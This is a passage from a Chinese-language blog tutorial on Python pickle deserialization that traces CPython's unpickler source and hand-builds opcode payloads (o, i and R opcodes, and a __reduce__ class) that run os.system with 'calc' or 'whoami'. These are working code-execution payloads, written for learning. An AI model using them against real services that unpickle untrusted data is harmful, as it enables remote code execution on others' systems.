<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    sys.audit(<span class="string">&#x27;pickle.find_class&#x27;</span>, module, name)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="variable language_">self</span>.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure>

<p><code>self.proto</code>进行版本检查，我们是4，直接对应下面代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>跟进后发现这是根据返回类名和值来返回一个类对象， 并把它压入栈中(此时还没有生成类对象)</p>
<p><code>EMPTY_TUPLE</code>( ) )   推送空元组</p>
<p><code>NEWOBJ</code>(\x81) 通过将 <code>cls.__new__</code> 应用于参数元组构建对象</p>
<p>又是一个陌生的方法，跟进查看一下</p>
<p>在<code>load_newobj</code>找到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_newobj_ex</span>(<span class="params">self</span>):</span><br><span class="line">    kwargs = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    args = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    cls = <span class="variable language_">self</span>.stack.pop()</span><br><span class="line">    obj = cls.__new__(cls, *args, **kwargs)</span><br><span class="line">    <span class="variable language_">self</span>.append(obj)</span><br><span class="line">dispatch[NEWOBJ_EX[<span class="number">0</span>]] = load_newobj_ex</span><br></pre></td></tr></table></figure>

<p>就是弹出前三个参来构建一个类，并压入栈中</p>
<p>EMPTY_DICT( } ) 推送空字典</p>
<p>\x8c 推送字符串’x’</p>
<p>\x94 压栈</p>
<p>BININT1(K) 推送一字节无符号整数 1</p>
<p>SETITEM(s) 向字典添加键值对，不知道这么配对的，跟进一下源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    value = stack.pop()</span><br><span class="line">    key = stack.pop()</span><br><span class="line">    <span class="built_in">dict</span> = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">dict</span>[key] = value</span><br><span class="line">dispatch[SETITEM[<span class="number">0</span>]] = load_setitem</span><br></pre></td></tr></table></figure>

<p>先弹值再弹键</p>
<p>最后一步BUILD(b) 调用 <code>__setstate__</code> 或 <code>__dict__.update()</code> 构建这个类</p>
<p>STOP( . ) 言简意赅，就是结束</p>
<p>我们通过跟进调试了解了过程，现在我们可以尝试自己写了</p>
<h2 id="pickle构造"><a href="#pickle构造" class="headerlink" title="pickle构造"></a>pickle构造</h2><h3 id="常见操作码构造"><a href="#常见操作码构造" class="headerlink" title="常见操作码构造"></a>常见操作码构造</h3><p>让我们重新研究一下 opcode ，找到下面操作码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># 构建并推送类实例</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># 构建并推送类实例</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># 对栈上的参数元组应用可调用对象</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># 从栈上的最上面的项构建元组</span></span><br><span class="line"></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># 推送 self.find_class(modname, name)；两个字符串参数</span></span><br></pre></td></tr></table></figure>

<p>我们对这三个研究一下</p>
<p>先从熟悉的global入手，翻到源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_global</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>.append(klass)</span><br><span class="line">dispatch[GLOBAL[<span class="number">0</span>]] = load_global</span><br></pre></td></tr></table></figure>

<p>还是很好懂的，和<code>stack_global</code>差不多只不过<code>stack_global</code>是从栈读取的，<code>global</code>是从行读取的也就是说从<code>c</code>开始要连续读取两行字符作为参数传递，前面简单的带了一笔具体使用方法我们可以跟进测试一下，我们直接跟进到<code>find_class</code>的<code>_getattribute</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_getattribute</span>(<span class="params">obj, name</span>):</span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> name.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> subpath == <span class="string">&#x27;&lt;locals&gt;&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">&quot;Can&#x27;t get local attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span></span><br><span class="line">                                 .<span class="built_in">format</span>(name, obj))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            parent = obj</span><br><span class="line">            obj = <span class="built_in">getattr</span>(obj, subpath)</span><br><span class="line">        <span class="keyword">except</span> AttributeError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">&quot;Can&#x27;t get attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span></span><br><span class="line">                                 .<span class="built_in">format</span>(name, obj)) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> obj, parent</span><br></pre></td></tr></table></figure>

<p>用到了<code>getattr</code>具体使用我们测试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>))	<span class="comment"># sys.modules是模拟find_class直接传过来的参</span></span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br></pre></td></tr></table></figure>

<p>直接调用了system函数</p>
<p>测试一下能不能直接用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;os&#x27;</span>],<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;calc&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器，说明<code>global</code> 就是个回调函数，同时我们也发现<code>getattr</code>会自动帮我们<code>import</code>库，相同的，说明pickle在load的时候也是自动<code>import</code>的</p>
<h3 id="o操作符"><a href="#o操作符" class="headerlink" title="o操作符"></a>o操作符</h3><p>知道了怎么用剩下就是构造执行的问题了，根据上面的有三种方法可以构造并推送，先从<code>o</code>操作码讲</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_obj</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># Stack is ... markobject classobject arg1 arg2 ...</span></span><br><span class="line">    args = <span class="variable language_">self</span>.pop_mark()</span><br><span class="line">    cls = args.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(cls, args)</span><br><span class="line">dispatch[OBJ[<span class="number">0</span>]] = load_obj</span><br></pre></td></tr></table></figure>

<p>提取的参要求是markobject或者classobject，构造类太麻烦了，我们看markobject</p>
<p>上面有一条</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br></pre></td></tr></table></figure>

<p>然后从标记的地方弹出获取第一个对象作为回调函数，第二个对象作为值然后推送</p>
<p>那么我们能构造出payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(cos</span><br><span class="line"> system</span><br><span class="line"> S<span class="string">&#x27;calc&#x27;</span></span><br><span class="line"> o.</span><br></pre></td></tr></table></figure>

<p>放到python测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;calc&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload.encode())</span><br><span class="line">pickletools.dis(payload.encode())</span><br><span class="line">pickle.loads(payload.encode())</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<h3 id="i操作符"><a href="#i操作符" class="headerlink" title="i操作符"></a>i操作符</h3><p>接下来我们看<code>i</code>操作码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_inst</span>(<span class="params">self</span>):</span><br><span class="line">    module = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    name = <span class="variable language_">self</span>.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    klass = <span class="variable language_">self</span>.find_class(module, name)</span><br><span class="line">    <span class="variable language_">self</span>._instantiate(klass, <span class="variable language_">self</span>.pop_mark())</span><br><span class="line">dispatch[INST[<span class="number">0</span>]] = load_inst</span><br></pre></td></tr></table></figure>

<p>在<code>i</code>操作码后面连续读取两行作为回调函数，然后在从<code>pop_mark</code>去参数传给回调函数</p>
<p>最后构建的payload为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S<span class="string">&#x27;calc&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>这个<code>pop_mark</code>一定要放在前面，试了半天，弄出来才恍然大悟，放在后面他读不到&#x3D; &#x3D;</p>
<p>测试一下成功弹计算器</p>
<h3 id="R操作符"><a href="#R操作符" class="headerlink" title="R操作符"></a>R操作符</h3><p>最后一个<code>t</code>+<code>R</code>构造</p>
<p><code>R</code>对栈上的参数元组应用可调用对象，需要元组自然需要<code>t</code>来构建</p>
<p>我们看<code>R</code>的源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_reduce</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    args = stack.pop()</span><br><span class="line">    func = stack[-<span class="number">1</span>]</span><br><span class="line">    stack[-<span class="number">1</span>] = func(*args)</span><br><span class="line">dispatch[REDUCE[<span class="number">0</span>]] = load_reduce</span><br></pre></td></tr></table></figure>

<p>很显而易见，从栈顶上弹出一个元组然后和栈上最后一个对象结合返回，很简单的就能构建出payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;calc&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>

<p>测试一下弹出计算器</p>
<h4 id="reduce-方法"><a href="#reduce-方法" class="headerlink" title="__reduce__方法"></a>__reduce__方法</h4><p>python和php一样有很多方法比如__init__类似与php的__constuct 都是初始化的调用，而有个很重要的方法就是__reduce__，我们看一下官方的描述</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">object.__reduce__()</span><br><span class="line">The interface is currently defined as follows. The __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”).</span><br><span class="line">If a string is returned, the string should be interpreted as the name of a global variable. It should be the object’s local name relative to its module; the pickle module searches the module namespace to determine the object’s module. This behaviour is typically useful for singletons.</span><br><span class="line">When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order:</span><br><span class="line">    A callable object that will be called to create the initial version of the object.</span><br><span class="line">    A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument.</span><br><span class="line">    Optionally, the object’s state, which will be passed to the object’s __setstate__() method as previously described. If the object has no such method then, the value must be a dictionary and it will be added to the object’s __dict__ attribute.</span><br><span class="line">    Optionally, an iterator (and not a sequence) yielding successive items. These items will be appended to the object either using obj.append(item) or, in batch, using obj.extend(list_of_items). This is primarily used for list subclasses, but may be used by other classes as long as they have append and extend methods with the appropriate signature. (Whether append() or extend() is used depends on which pickle protocol version is used as well as the number of items to append, so both must be supported.)</span><br><span class="line">    Optionally, an iterator (not a sequence) yielding successive key-value pairs. These items will be stored to the object using obj[key] = value. This is primarily used for dictionary subclasses, but may be used by other classes as long as they implement __setitem__().</span><br><span class="line">    Optionally, a callable with a (obj, state) signature. This callable allows the user to programmatically control the state-updating behavior of a specific object, instead of using obj’s static __setstate__() method. If not None, this callable will have priority over obj’s __setstate__().</span><br><span class="line">    New in version 3.8: The optional sixth tuple item, (obj, state), was added.</span><br><span class="line">    </span><br><span class="line">接口当前定义如下。__reduce__()方法不接受参数，返回一个字符串，最好是一个元组(返回的对象通常被称为“reduce值”)。</span><br><span class="line">如果返回的是字符串，则应该将该字符串解释为全局变量的名称。它应该是对象相对于其模块的局部名称;pickle模块通过搜索模块命名空间来确定对象所属的模块。这种行为通常对单例很有用。</span><br><span class="line">返回元组时，它的长度必须在2到6个元素之间。可选项可以省略，也可以赋值None。每个元素项的语义如下:</span><br><span class="line">	一个可调用对象，将被调用以创建该对象的初始版本。</span><br><span class="line">	可调用对象的参数元组。如果可调用对象不接受任何参数，则必须给出空元组。</span><br><span class="line">	对象的状态是可选的，它将像之前描述的那样传递给对象的__setstate__()方法。如果对象没有这样的方法，则值必须是一个字典，并将其添加到对象的__dict__属性中。</span><br><span class="line">	可选的，产生连续元素的迭代器(而不是序列)。这些项可以使用obj.append(item)添加到对象中，也可以使用obj.extend(list_of_items)批量添加。这主要用于列表的子类，但其他类也可以使用，只要添加和扩展的方法具有适当的签名。(使用append()还是extend()取决于使用的pickle协议版本以及要追加的项的数量，因此必须同时支持这两种协议。)</span><br><span class="line">	一个可选的迭代器(不是序列)，产生连续的键值对。使用obj[key] = value将这些项存储到对象中。这主要用于字典的子类，但其他类也可以使用，只要它们实现了__setitem__()。</span><br><span class="line">	可选的，带有(obj, state)签名的可调用对象。这个可调用方法允许用户以编程方式控制特定对象的状态更新行为，而不是使用obj的静态__setstate__()方法。如果不是None，这个可调用对象将优先于obj的__setstate__()。</span><br><span class="line">	3.8新版功能:添加了可选的第六个元组项(obj, state)。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>它应该是对象相对于其模块的局部名称;pickle模块通过搜索模块命名空间来确定对象所属的模块</p>
</blockquote>
<p>pickle在loads的时候就会触发这个方法，我们就可以构造__reduce__来执行我们想要的命令</p>
<p>我们简单写一下测试代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&quot;whoami&quot;</span>,))</span><br><span class="line"></span><br><span class="line">p=A()</span><br><span class="line">s=pickle.dumps(p)</span><br><span class="line">pickletools.dis(s)</span><br><span class="line">pickle.loads(s)</span><br></pre></td></tr></table></figure>

<p><em>可以看到在<code>__reduce__</code>是要import模块来导入os的</em></p>
<p>回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    0: \x80 PROTO      4</span><br><span class="line">    2: \x95 FRAME      30</span><br><span class="line">   11: \x8c SHORT_BINUNICODE &#x27;nt&#x27;</span><br><span class="line">   15: \x94 MEMOIZE    (as 0)</span><br><span class="line">   16: \x8c SHORT_BINUNICODE &#x27;system&#x27;</span><br><span class="line">   24: \x94 MEMOIZE    (as 1)</span><br><span class="line">   25: \x93 STACK_GLOBAL</span><br><span class="line">   26: \x94 MEMOIZE    (as 2)</span><br><span class="line">   27: \x8c SHORT_BINUNICODE &#x27;whoami&#x27;</span><br><span class="line">   35: \x94 MEMOIZE    (as 3)</span><br><span class="line">   36: \x85 TUPLE1</span><br><span class="line">   37: \x94 MEMOIZE    (as 4)</span><br><span class="line">   38: R    REDUCE</span><br><span class="line">   39: \x94 MEMOIZE    (as 5)</span><br><span class="line">   40: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">osthing\28659</span><br></pre></td></tr></table></figure>

<p>成功执行命令，同时可以看见，<code>__reduce__</code>实际是执行<code>R</code>操作码的</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/oSthing">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">Pickle 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%BF%9B%E8%B0%83%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">跟进调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools"><span class="toc-number">1.1.1.</span> <span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text">pickle构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%A0%81%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">常见操作码构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#o%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.2.</span> <span class="toc-text">o操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#i%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.3.</span> <span class="toc-text">i操作符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">1.2.4.</span> <span class="toc-text">R操作符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reduce-%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">__reduce__方法</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=Python_pickle反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=Python_pickle反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python_pickle反序列化&body=Check out this article: http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=Python_pickle反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=Python_pickle反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/20/Python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=Python_pickle反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    oSthing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/oSthing">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
